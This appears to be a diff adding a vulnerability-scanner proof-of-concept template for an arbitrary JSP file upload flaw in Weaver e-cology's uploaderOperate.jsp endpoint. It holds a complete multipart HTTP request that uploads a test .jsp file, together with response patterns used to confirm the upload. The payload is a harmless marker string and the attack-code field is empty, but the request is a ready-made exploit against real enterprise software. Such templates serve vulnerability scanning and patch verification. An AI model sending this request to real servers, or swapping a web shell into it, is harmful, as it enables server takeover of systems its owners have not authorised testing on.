@@ -1,0 +1,29 @@
+﻿<DudePoc_Name>泛微 e-cology uploaderOperate.jsp 存在文件上传漏洞</DudePoc_Name>
+<DudePoc_Description>上海泛微网络科技股份有限公司的e-cology存在文件上传漏洞，攻击者利用该漏洞可以获取服务器权限。</DudePoc_Description>
+<DudePoc_SetHeader>
+POST /workrelate/plan/util/uploaderOperate.jsp HTTP/1.1
+Host: $<AttackHost>$
+Referer: $<AttackReferer>$/
+Content-Length: 0
+Content-Type: multipart/form-data; boundary=5bade36e1ef037ba47f545fe80bed819
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+--5bade36e1ef037ba47f545fe80bed819
+Content-Disposition: form-data; name="secId"; filename=""
+
+1
+--5bade36e1ef037ba47f545fe80bed819
+Content-Disposition: form-data; name="Filedata"; filename="test123.jsp"
+
+dude
+--5bade36e1ef037ba47f545fe80bed819
+Content-Disposition: form-data; name="plandetailid"; filename=""
+
+1
+--5bade36e1ef037ba47f545fe80bed819--
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>200</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData>^(?=.*?(?:btn_wh|test123.jsp)).*?$</DudePoc_VerifyData>
+<DudePoc_VerifyFile></DudePoc_VerifyFile>
+<DudePoc_AttackCode></DudePoc_AttackCode>
